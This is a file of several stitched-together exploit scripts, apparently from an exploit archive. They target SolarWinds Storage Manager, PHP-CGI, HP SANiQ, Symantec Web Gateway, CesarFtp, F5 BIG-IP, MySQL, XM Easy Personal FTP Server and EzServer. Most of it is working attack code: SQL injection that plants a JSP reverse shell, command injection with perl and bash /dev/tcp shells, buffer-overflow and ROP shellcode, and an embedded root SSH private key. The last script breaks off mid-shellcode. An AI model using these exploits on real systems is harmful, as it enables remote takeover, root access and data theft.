output_path= "c:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/%s" %filename

jsp = '''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
	class StreamConnector extends Thread
	{
		InputStream is;
		OutputStream os;

		StreamConnector( InputStream is, OutputStream os )
		{
		this.is = is;
		this.os = os;
		}

		public void run()
		{
		BufferedReader in  = null;
		BufferedWriter out = null;
try
{
	in  = new BufferedReader( new InputStreamReader( this.is ) );
	out = new BufferedWriter( new OutputStreamWriter( this.os ) );
	char buffer[] = new char[8192];
	int length;
	while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
	{
		out.write( buffer, 0, length );
		out.flush();
	}
} catch( Exception e ){}
try
{
	if( in != null )
		in.close();
	if( out != null )
		out.close();
} catch( Exception e ){}
		}
	}

	try
	{
		Socket socket = new Socket( "''' + lhost +'''", '''+lport+''');
		Process process = Runtime.getRuntime().exec( "cmd.exe" );
		( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
		( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
	} catch( Exception e ) {}
%>'''

jsp = jsp.replace("\n","")
jsp = jsp.replace("\t","")

prepayload = "AAA' "
prepayload += 'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile "%s"' % (jsp.encode('hex'),output_path)
prepayload += "#"
postpayload = "1' or 1=1#--"
loginstate='checkLogin'
password = 'OHAI'

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : prepayload,'password' : password})
print "[*] Sending evil payload"
resp = opener.open("http://%s:9000/LoginServlet" %rhost, post_params)
print "[*] Triggering shell"
post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : postpayload,'password' : password})
resp = opener.open("http://%s:9000/LoginServlet" % rhost, post_params)
resp = opener.open("http://%s:9000/%s"  % (rhost,filename))
print "[*] Check your shell on %s %s\n" % (lhost,lport)

# 01010011 01101100 01100101 01100101 01110000 01101001 01110011 01101111 
# 01110110 01100101 01110010 01110010 01100001 01110100 01100101 01100100
######################################################################################
# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit
# Date: May 4, 2012
# Author: rayh4c[0x40]80sec[0x2e]com
# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com
######################################################################################

import socket
import sys

def cgi_exploit():
        pwn_code = """<?php phpinfo();?>""" 
        post_Length = len(pwn_code)
        http_raw="""POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s
""" %(HOST , post_Length ,pwn_code)
        print http_raw
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, int(PORT)))
            sock.send(http_raw)
            data = sock.recv(10000)
            print repr(data)
            sock.close()
        except socket.error, msg:
            sys.stderr.write("[ERROR] %s\n" % msg[1])
            sys.exit(1)
               
if __name__ == '__main__':
        try:
            HOST = sys.argv[1]
            PORT = sys.argv[2]
            cgi_exploit()
        except IndexError:
            print '[+]Usage: cgi_test.py site.com 80'
            sys.exit(-1)#!/usr/bin/python

''' ==================================
          Pseudo documentation 
================================== '''

# HP VSA / SANiQ Hydra client
# Nicolas Grégoire <nicolas.gregoire@agarri.fr>
# v0.5

''' ==================================
          Target information
================================== '''

HOST = '192.168.201.11'	# The remote host
PORT = 13838		# The hydra port

''' ==================================
             Imports 
================================== '''

import getopt
import re
import sys
import binascii
import struct
import socket
import os

''' ==================================
        Define functions
================================== '''

# Some nice formatting
def zprint(str):
	print '[=] ' + str

# Define packets
def send_Exec():
	zprint('Send Exec')
	
	# RESTRICTIONS
	# You can't use "/" in the payload
	# No Netcat/Ruby/PHP, but telnet/bash/perl are available

	# METASPLOIT PAYLOAD
	cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,12345,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"

	# COMMAND INJECTION BUG
	data = 'get:/lhn/public/network/ping/127.0.0.1/foobar;' + cmd + '/'

	# EXPLOIT
	zprint('Now connect to port 12345 of machine ' + str(HOST))
	send_packet(data)

def send_Login():
	zprint('Send Login')
	data = 'login:/global$agent/L0CAlu53R/Version "8.5.0"' # Backdoor
	send_packet(data)

# Define the sending function
def send_packet(message):

	# Add header
	ukn1 = '\x00\x00\x00\x00\x00\x00\x00\x01'
	ukn2 = '\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x14\xff\xff\xff\xff'
	message = message + '\x00'
	data = ukn1 + struct.pack('!I', len(message)) + ukn2 + message

	# Send & receive
	s.send(data)
	data = s.recv(1024)
	zprint('Received : [' + data + ']')

''' ==================================
           Main code
================================== '''

# Print bannner
zprint('HP Hydra client')
zprint('Attacking host ' + HOST + ' on port ' + str(PORT))

# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((HOST, PORT))

# Attack !
send_Login()
send_Exec()

# Deconnect
s.close

# Exit
zprint('Exit')

#!/usr/bin/python

# Symantec Web Gateway 5.0.2 Remote LFI root Exploit Proof of Concept
# Exploit requires no authentication, /tmp/networkScript is sudoable and apache writable.
# muts at offensive-security dot com


import socket
import base64

payload= '''echo '#!/bin/bash' > /tmp/networkScript; echo 'bash -i >& /dev/tcp/172.16.164.1/1234 0>&1' >> /tmp/networkScript;chmod 755 /tmp/networkScript; sudo /tmp/networkScript'''
payloadencoded=base64.encodestring(payload).replace("\n","")
taint="GET /<?php shell_exec(base64_decode('%s'));?> HTTP/1.1\r\n\r\n" % payloadencoded

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.164.129", 80))
expl.send(taint)
expl.close()

trigger="GET /spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log HTTP/1.0\r\n\r\n"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.164.129", 80))
expl.send(trigger)
expl.close()
#!/usr/bin/python
#CesarFtp 0.99g 0day Exploit
#Proof of Concept: execute calc.exe
#Tested on XP sp2 polish
#Bug found by h07 [h07@interia.pl]
#Date: 10.06.2006

from socket import *

shellcode = ( #execute calc.exe <metasploit.com>
"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

def intel_order(i):
    a = chr(i % 256)
    i = i >> 8
    b = chr(i % 256)
    i = i >> 8
    c = chr(i % 256)
    i = i >> 8
    d = chr(i % 256)
    str = "%c%c%c%c" % (a, b, c, d)
    return str

host = "127.0.0.1"
port = 21
user = "h07"
password = "open"
EIP = 0x7CA58265 #jmp esp <shell32.dll XP sp2 polish>

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

buffer = "MKD "
buffer += "\n" * 671
buffer += "A" * 3 + intel_order(EIP)
buffer += "\x90" * 40 + shellcode
buffer += "\r\n"

print "len: %d" % (len(buffer))

s.send(buffer)
print s.recv(1024)

s.close()

#EoF 

# milw0rm.com [2006-06-12]
#!/usr/bin/python
#
# Title: F5 BIG-IP Remote Root Authentication Bypass Vulnerability (py)
#
# Quick script written by Dave Kennedy (ReL1K) for F5 authentication root bypass
# http://www.secmaniac.com
#
#
import subprocess,os
  
filewrite = file("priv.key", "w")
filewrite.write("""-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----""")
filewrite.close()
subprocess.Popen("chmod 700 priv.key", shell=True).wait()
  
ipaddr=raw_input("Enter the IP address of the F5: ")
subprocess.Popen("ssh -i priv.key root@%s" % (ipaddr), shell=True).wait()
 
if os.path.isfile("priv.key"):
    os.remove("priv.key")
#!/usr/bin/python
#
#
# This has to be the easiest "exploit" ever. Seriously. Embarassed to submit this a little.
#
# Title: MySQL Remote Root Authentication Bypass
# Written by: Dave Kennedy (ReL1K)
# http://www.secmaniac.com
#
# Original advisory here: seclists.org/oss-sec/2012/q2/493
import subprocess

ipaddr = raw_input("Enter the IP address of the mysql server: ")

while 1:
	subprocess.Popen("mysql --host=%s -u root mysql --password=blah" % (ipaddr), shell=True).wait()
#!/usr/bin/python
# XM Easy Personal FTP Server v <= 5.30 Remote Format String write4 Exploit
# exploit by: mr_me (@net__ninja/mr_me[at]corelan.be)
# Thanks to the Corelan Security Team
# Note: this is a poc only, and requires the following target environment:
# 	Windows Server 23k:
#		- msvcrt.dll v7.0.3790.3959
#		- ntdll.dll v5.2.3790.4937
#
#	..or
#
#	Windows XP SP3:
#		- msvcrt.dll v7.0.2600.5512
#		- ntdll.dll v5.1.2600.6055
# 
# Fully tested against these environments.
# 
# An additional offset for the allocated chunk (0x00AEFAB9) under Windows XP SP3 
# (ntdll.dll vv5.1.2600.5512 (xpsp.080413-2111)) are:
#	
# 	if auth_required == 1:
#		sploit += "%11467127x"       # lookaside chunk address 0x00AEFAB9
#	elif auth_required == 2:
#		sploit += "%11467133x"       # lookaside chunk address 0x00AEFAB9
# 
# Thanks to @_bcoles for the additional testing and target.
#
# Well, after 6 years of DoS, 2 DoS metasploit modules later, I thought it would be a good
# time for some unreliable RCE:
#
# - http://www.exploit-db.com/search/?action=search&filter_description=XM+Easy+Personal
# - http://www.metasploit.com/modules/framework/search?utf8=%E2%9C%93&osvdb=&bid=&text=XM+Easy&cve=&msb=
#
# How is the exploit working? Voodoo? ...no
# 
# Basically at crash time I could only find our string at [esp-0xYYYYYYYY] and as such 
# couldn't use our string to overwrite an arbitrary function pointer. But when I looked 
# closer at the esp, I noticed that at esp+0x7c an object is stored. So what I did was 
# use the %n to overwrite the objects vtable with a controlled value (str length + %YYx 
# to pad out the arbitrary fake vtable). During the application authentication routine, 
# it will allocate the strings we send as USER/PASS from a heap and then free them to 
# the lookaside (as long as the string length is < 1016 bytes in size).
# 
# Because this address is relative and has a static base in this environment, I was able
# to use the heap chunk address as the pointer to write at the vtable. Then a function is
# called at offset 0xb0 or 0x98 and we can reliably return into a ROP payload and execute
# arbitrary code.
#
# Enjoy the shells guys 
# ~ mr_me
# 
# example exploitation against XP:
#
# mr_me@gliese:~/pentest/research/targets/xm$ ./xm_pwnage.py 192.168.153.160 
# -------------------------------------------------------------------------
#  XM Easy Personal FTP Server <= v5.30 Remote Format String Write4 Exploit
#  Written by mr_me (@net__ninja)                                            
# -------------------------------------------------------------------------
# 
# (+) Choose your target:
# 	1. Windows Server 2003 EN
# 	2. Windows XP SP3 EN
# --> 2
# (+) Choose your option:
#       1. use no authentication (anonymous is disabled)
#       2. use authentication (anonymous is enabled)
# --> 1
# (+) Connecting to the target 192.168.153.160:21
# (+) Seeding payload...
# (+) Triggering write4....
# (+) Connecting to the targets shell!
# Connection to 192.168.153.160 4444 port [tcp/*] succeeded!
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\Documents and Settings\steve>
#
# example exploitation against Windows Server 23k:
#
# mr_me@gliese:~/pentest/research/targets/xm$ ./poc_working.py 192.168.153.159 
# -------------------------------------------------------------------------
#  XM Easy Personal FTP Server <= v5.30 Remote Format String Write4 Exploit
#  Written by mr_me (@net__ninja)                                          
# -------------------------------------------------------------------------
# 
# (+) Choose your target:
# 	1. Windows Server 2003 EN
# 	2. Windows XP SP3 EN
# --> 1
# (+) Choose your option:
# 	1. use no authentication (anonymous is disabled)
# 	2. use authentication (anonymous is enabled)
# --> 2
# (+) Connecting to the target 192.168.153.159:21
# (+) Seeding payload...
# (+) Triggering write4....
# (+) Connecting to the targets shell!
# Connection to 192.168.153.159 4444 port [tcp/*] succeeded!
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
# 
# C:\Documents and Settings\Administrator\Desktop>
#

import socket
import struct
import sys
from os import system
from time import sleep

host = ''
port = 21

# ./msfpayload windows/shell_bind_tcp exitfunc=seh R | 
# ./msfencode -b "\x00\x0a\x0d" -e x86/jmp_call_additive -t c
# [*] x86/jmp_call_additive succeeded with size 373 (iteration=1
sc = ("\xfc\xbb\x70\x4e\xf9\xb6\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x8c\xa6\x70\xb6\x6c"
"\x37\xe3\x3e\x89\x06\x31\x24\xda\x3b\x85\x2e\x8e\xb7\x6e\x62"
"\x3a\x43\x02\xab\x4d\xe4\xa9\x8d\x60\xf5\x1f\x12\x2e\x35\x01"
"\xee\x2c\x6a\xe1\xcf\xff\x7f\xe0\x08\x1d\x8f\xb0\xc1\x6a\x22"
"\x25\x65\x2e\xff\x44\xa9\x25\xbf\x3e\xcc\xf9\x34\xf5\xcf\x29"
"\xe4\x82\x98\xd1\x8e\xcd\x38\xe0\x43\x0e\x04\xab\xe8\xe5\xfe"
"\x2a\x39\x34\xfe\x1d\x05\x9b\xc1\x92\x88\xe5\x06\x14\x73\x90"
"\x7c\x67\x0e\xa3\x46\x1a\xd4\x26\x5b\xbc\x9f\x91\xbf\x3d\x73"
"\x47\x4b\x31\x38\x03\x13\x55\xbf\xc0\x2f\x61\x34\xe7\xff\xe0"
"\x0e\xcc\xdb\xa9\xd5\x6d\x7d\x17\xbb\x92\x9d\xff\x64\x37\xd5"
"\xed\x71\x41\xb4\x79\xb5\x7c\x47\x79\xd1\xf7\x34\x4b\x7e\xac"
"\xd2\xe7\xf7\x6a\x24\x08\x22\xca\xba\xf7\xcd\x2b\x92\x33\x99"
"\x7b\x8c\x92\xa2\x17\x4c\x1b\x77\xb7\x1c\xb3\x28\x78\xcd\x73"
"\x99\x10\x07\x7c\xc6\x01\x28\x57\x71\x06\xe6\x8c\xd1\xe1\x0b"
"\x32\xc7\xad\x82\xd4\x8d\x5d\xc3\x4f\x3a\x9c\x30\x58\xdd\xdf"
"\x12\xf5\x76\x48\x2a\x10\x40\x77\xab\x37\xe2\xd4\x03\xdf\x71"
"\x37\x90\xfe\x85\x12\xb0\x89\xbd\xf5\x4a\xe7\x0c\x67\x4a\x22"
"\xe6\x04\xd9\xa8\xf7\x43\xc2\x67\xaf\x04\x34\x71\x25\xb9\x6f"
"\x2b\x58\x40\xe9\x14\xd8\x9f\xca\x9b\xe0\x52\x76\xbf\xf2\xaa"
"\x77\xfb\xa6\x62\x2e\x55\x11\xc5\x98\x17\xcb\x9f\x77\xf1\x9b"
"\x66\xb4\xc2\xdd\x66\x91\xb5\x02\xd6\x4c\x83\x3d\xd7\x18\x03"
"\x45\x05\xb9\xec\x9c\x8d\xc7\x1c\x2d\x18\x5f\x86\xc4\x61\x3d"
"\x39\x33\xa5\x38\xb9\xb6\x56\xbf\xa1\xb2\x53\xfb\x66\x2e\x2e"
"\x94\x02\x50\x9d\x95\x07\x50\x21\x6a\xa7\x51\x21\x6a")

def banner():
	print "-------------------------------------------------------------------------"
	print " XM Easy Personal FTP Server <= v5.30 Remote Format String Write4 Exploit"
	print " Written by mr_me (@net__ninja)                                          "
	print "-------------------------------------------------------------------------\n"

if (len(sys.argv) < 2):
	banner()
	print "Usage: %s <target_ip> [port]" %(sys.argv[0])
	sys.exit(1)

if (len(sys.argv) == 3):
	port = int(sys.argv[2])

host = sys.argv[1]

banner()

print("(+) Choose your target:")
print("	1. Windows Server 2003 EN")	
print("	2. Windows XP SP3 EN")

try:
	target = int(raw_input("--> "))
except:
	print("Exiting..")
	sys.exit(0)

if target not in [1,2]:
	print("(-) Invalid target!")
	sys.exit(0)

print("(+) Choose your option:")
print("	1. use no authentication (anonymous is disabled)")
print("	2. use authentication (anonymous is enabled)")

try:
        auth_required = int(raw_input("--> "))	
except:
        print("Exiting..")
        sys.exit(0)

if auth_required not in [1,2]:
        print("(-) Invalid option!")
        sys.exit(0)

# start building the attack string
sploit  = "ABOR "

# rop - Windows Server 23k
if target == 1:
	# C:\WINDOWS\system32\msvcrt.dll v7.0.3790.3959
	rop  = struct.pack('<L', 0x77be3adb) # pop eax ; retn
	rop += struct.pack('<L', 0x77ba1114) # <- *&VirtualProtect()
	rop += struct.pack('<L', 0x77bbf244) # mov eax,[eax] ; pop ebp ; retn
	rop += struct.pack('<L', 0x41414141) # junk ------------^
	rop += struct.pack('<L', 0x77bb0c86) # xchg eax,esi ; retn
	rop += struct.pack('<L', 0x77be3adb) # pop eax ; retn
	rop += struct.pack('<L', 0xFFFFFBFF) # dwSize
	rop += struct.pack('<L', 0x77BAD64D) # neg eax ; pop ebp ; retn
	rop += struct.pack('<L', 0x41414141) # junk ------^
	rop += struct.pack('<L', 0x77BBF102) # xchg eax,ebx ; add [eax],al ; retn
	rop += struct.pack('<L', 0x77bbfc02) # pop ecx ; retn
	rop += struct.pack('<L', 0x77bef001) # ptr that is w+
	rop += struct.pack('<L', 0x77bd8c04) # pop edi ; retn
	rop += struct.pack('<L', 0x77bd8c05) # retn
	rop += struct.pack('<L', 0x77be3adb) # pop eax ; retn
	rop += struct.pack('<L', 0xFFFFFFC0) # flNewProtect
	rop += struct.pack('<L', 0x77BAD64D) # neg eax ; pop ebp ; retn
	rop += struct.pack('<L', 0x77be2265) # ptr to 'push esp ; ret'
	rop += struct.pack('<L', 0x77BB8285) # xchg eax,edx ; retn
	rop += struct.pack('<L', 0x77be3adb) # pop eax ; retn
	rop += struct.pack('<L', 0x90909090) # nops
	rop += struct.pack('<L', 0x77be6591) # pushad ; add al,0ef ; retn

	if auth_required == 1:
		sploit += "%12133031x"       # lookaside chunk address #11204415
	elif auth_required == 2:
		sploit += "%12133037x"       # lookaside chunk address

	pivot = "\x35\x62\xba\x77"           # 0x77BA6235 - xchg eax,esp; retn
	jump  = "\xeb\x56"                   # jump forward into our shellcode

# rop - Windows XP SP3
elif target == 2:
	# C:\WINDOWS\system32\msvcrt.dll v7.0.2600.5512
	rop  = struct.pack('<L', 0x77C21D16) # pop eax ; retn
	rop += struct.pack('<L', 0x77C11120) # <- *&VirtualProtect()
	rop += struct.pack('<L', 0x77C2E493) # mov eax,[eax] ; pop ebp ; retn
	rop += struct.pack('<L', 0x41414141) # junk ------------^
	rop += struct.pack('<L', 0x77C21891) # pop esi ; retn
	rop += struct.pack('<L', 0x77C5D010) # ptr that is w+
	rop += struct.pack('<L', 0x77C2DD6C) # xchg eax,esi ; add [eax],al; retn
	rop += struct.pack('<L', 0x77C21D16) # pop eax ; retn
	rop += struct.pack('<L', 0xFFFFFBFF) # dwSize
	rop += struct.pack('<L', 0x77C1BE18) # neg eax ; pop ebp ; retn
	rop += struct.pack('<L', 0x41414141) # junk ------^
	rop += struct.pack('<L', 0x77C2362C) # pop ebx ; retn
	rop += struct.pack('<L', 0x77C5D010) # ptr that is w+
	rop += struct.pack('<L', 0x77C2E071) # xchg eax,ebx ; add [eax],al ; retn
	rop += struct.pack('<L', 0x77C1F519) # pop ecx ; retn
	rop += struct.pack('<L', 0x77C5D010) # ptr that is w+
	rop += struct.pack('<L', 0x77C23B47) # pop edi ; retn
	rop += struct.pack('<L', 0x77C23B48) # retn
	rop += struct.pack('<L', 0x77C21D16) # pop eax ; retn
	rop += struct.pack('<L', 0xFFFFFFC0) # flNewProtect
	rop += struct.pack('<L', 0x77C1BE18) # neg eax ; pop ebp ; retn
	rop += struct.pack('<L', 0x77C35459) # ptr to 'push esp ; ret'
	rop += struct.pack('<L', 0x77C58FBC) # xchg eax,edx ; retn
	rop += struct.pack('<L', 0x77C21D16) # pop eax ; retn
	rop += struct.pack('<L', 0x90909090) # nops
	rop += struct.pack('<L', 0x77C567F0) # pushad ; add al,0ef ; retn

	if auth_required == 1:
		sploit += "%11204415x"       # lookaside chunk address
	elif auth_required == 2:
		sploit += "%11204421x"       # lookaside chunk address
	
	pivot = "\xd5\x5e\xc1\x77"           # 0x77C15ED5 - xchg eax,esp; retn
	jump  = "\xeb\x4a"                   # jump forward into our shellcode
	

sploit += "%p" * 31                          # offset to the object on the stack
sploit += "%n" * 1                           # write the controlled value into the vtable
sploit += "\x45" * 4500

username  = "USER anonymous\r\n"
password  = "PASS anonymous@"
password += rop
password += jump
password += "\x62" * (0x96-len(rop))
password += pivot                            # vtable+0x98 function
password += "\x62" * 0x14	
password += pivot                            # vtable+0xb0 function
password += sc                                  
password += "\x62" * (0x398-len(password))
password += ".com\r\n"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "(+) Connecting to the target %s:%d" % (host, port)
	s.connect((host,port))
except:
	print("(-) Cannot connect to the target %s:%s" % (host, port))
	sys.exit(0)

try:
	print "(+) Seeding payload..."
	s.recv(1024)
	s.send(username)
	s.recv(1024)
	s.send(password)
	s.recv(1024)
	print "(+) Triggering write4..."
	s.send(sploit)
	s.recv(1024)
	s.close()
except:
	print "(-) Failed to trigger the vulnerability...!"
	sys.exit(0)

print "(+) Connecting to the targets shell!"
	
try:
	sleep(1)
	system("nc -v %s 4444" % host)
except:
	print("(-) Exploit failed! check if the target service is up")
	sys.exit(0)
# Exploit Title: Ezhometech EzServer <=6.4 Stack Overflow Vulnerability
# Author: modpr0be
# Contact: research[at]Spentera[dot]com
# Platform: Windows
# Tested on: Windows XP SP3 (OptIn), Windows 2003 SP2 (OptIn)
# Software Link: http://www.ezhometech.com/buy_ezserver.htm
# References: http://www.spentera.com/2012/06/ezhometech-ezserver-6-4-stack-overflow-vulnerability/
 
### Software Description
# EZserver is a Video Server that stream Full HD to various devices.

### Vulnerability Details
# Buffer overflow condition exist in URL handling, sending long GET request 
# will cause server process to exit and may allow malicious code injection. 
# Further research found that the application does not care about the HTTP method, 
# so that by sending long characters will make the program crash.
 
### Vendor logs:
# 06/11/2012 - Bug found
# 06/12/2012 - Vendor contacted
# 06/16/2012 - No response from vendor, POC release.

#!/usr/bin/python

import sys
import struct
from socket import *
from os import system
from time import sleep

hunt = (
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A"
"\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
"\xEF\xB8\x77\x30\x30\x74\x8B\xFA"
"\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

#windows/shell_bind_tcp - 751 bytes
#http://www.metasploit.com
#Encoder: x86/alpha_upper
#AutoRunScript=, VERBOSE=false, EXITFUNC=process, LPORT=4444, 

shellcode = ("\x89\xe5\xda\xcf\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49\x49\x43"
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4c\x49\x45\x50"
"\x35\x50\x53\x30\x35\x30\x4b\x39\x4a\x45\x36\x51\x38\x52\x33"
"\x54\x4c\x4b\x50\x52\x56\x50\x4c\x4b\x46\x32\x44\x4c\x4c\x4b"
"\x30\x52\x45\x44\x4c\x4b\x33\x42\x37\x58\x44\x4f\x38\x37\x51"
"\x5a\x57\x56\x50\x31\x4b\x4f\x36\x51\x4f\x30\x4e\x4c\x47\x4c"
"\x53\x51\x43\x4c\x34\x42\x46\x4c\x37\x50\x49\x51\x38\x4f\x54"
"\x4d\x53\x31\x38\x47\x4a\x42\x4a\x50\x36\x32\x56\x37\x4c\x4b"
"\x56\x32\x44\x50\x4c\x4b\x37\x32\x37\x4c\x43\x31\x38\x50\x4c"
"\x4b\x37\x30\x33\x48\x4b\x35\x59\x50\x54\x34\x31\x5a\x33\x31"
"\x4e\x30\x36\x30\x4c\x4b\x30\x48\x52\x38\x4c\x4b\x56\x38\x57"
"\x50\x53\x31\x4e\x33\x4a\x43\x57\x4c\x30\x49\x4c\x4b\x50\x34"
"\x4c\x4b\x53\x31\x39\x46\x50\x31\x4b\x4f\x36\x51\x59\x50\x4e"
"\x4c\x59\x51\x48\x4f\x34\x4d\x45\x51\x59\x57\x50\x38\x4b\x50"
"\x53\x45\x5a\x54\x33\x33\x53\x4d\x4b\x48\x47\x4b\x33\x4d\x31"
"\x34\x42\x55\x4a\x42\x46\x38\x4c\x4b\x36\x38\x31\x34\x45\x51"
"\x38\x53\x55\x36\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x58\x35"
"\x4c\x43\x31\x59\x43\x4c\x4b\x34\x44\x4c\x4b\x35\x51\x48\x50"
"\x4c\x49\x31\x54\x31\x34\x57\x54\x51\x4b\x31\x4b\x55\x31\x56"
"\x39\x30\x5a\x50\x51\x4b\x4f\x4d\x30\x31\x48\x31\x4f\x30\x5a"
"\x4c\x4b\x54\x52\x5a\x4b\x4d\x56\x51\x4d\x33\x58\x37\x43\x47"
"\x42\x45\x50\x53\x30\x43\x58\x34\x37\x53\x43\x46\x52\x31\x4f"
"\x50\x54\x52\x48\x30\x4c\x54\x37\x46\x46\x53\x37\x4b\x4f\x39"
"\x45\x58\x38\x4c\x50\x55\x51\x43\x30\x45\x50\x37\x59\x58\x44"
"\x46\x34\x56\x30\x53\x58\x31\x39\x4d\x50\x32\x4b\x45\x50\x4b"
"\x4f\x58\x55\x36\x30\x56\x30\x56\x30\x46\x30\x47\x30\x46\x30"
"\x31\x50\x46\x30\x55\x38\x4a\x4a\x44\x4f\x39\x4f\x4b\x50\x4b"
"\x4f\x48\x55\x4d\x59\x59\x57\x50\x31\x59\x4b\x30\x53\x55\x38"
"\x55\x52\x35\x50\x52\x31\x51\x4c\x4b\x39\x4a\x46\x32\x4a\x32"
"\x30\x31\x46\x50\x57\x35\x38\x49\x52\x59\x4b\x56\x57\x53\x57"
"\x4b\x4f\x39\x45\x30\x53\x51\x47\x52\x48\x4e\x57\x4d\x39\x37"
"\x48\x4b\x4f\x4b\x4f\x49\x45\x51\x43\x50\x53\x30\x57\x35\x38"
"\x44\x34\x5a\x4c\x47\x4b\x4b\x51\x4b\x4f\x49\x45\x56\x37\x4c"
"\x49\x58\x47\x43\x58\x34\x35\x42\x4e\x50\x4d\x53\x51\x4b\x4f"
"\x58\x55\x55\x38\x43\x53\x52\x4d\x33\x54\x55\x50\x4c\x49\x4b"
"\x53\x51\x47\x46\x37\x31\x47\x36\x51\x4c\x36\x33\x5a\x42\x32"
"\x31\x49\x46\x36\x5a\x42\x4b\x4d\x45\x36\x48\x47\x47\x34\x31"
"\x34\x37\x4c\x55\x51\x33\x31\x4c\x4d\x30\x44\x47\x54\x44\x50"
"\x48\x46\x35\x50\x30\x44\x30\x54\x30\x50\x46\x36\x51\x46\x56"
"\x36\x37\x36\x46\x36\x30\x4e\x31\x46\x51\x46\x51\x43\x31\x46"
"\x32\x48\x52\x59\x48\x4c\x57\x4f\x4b\x36\x4b\x4f\x38\x55\x4d"
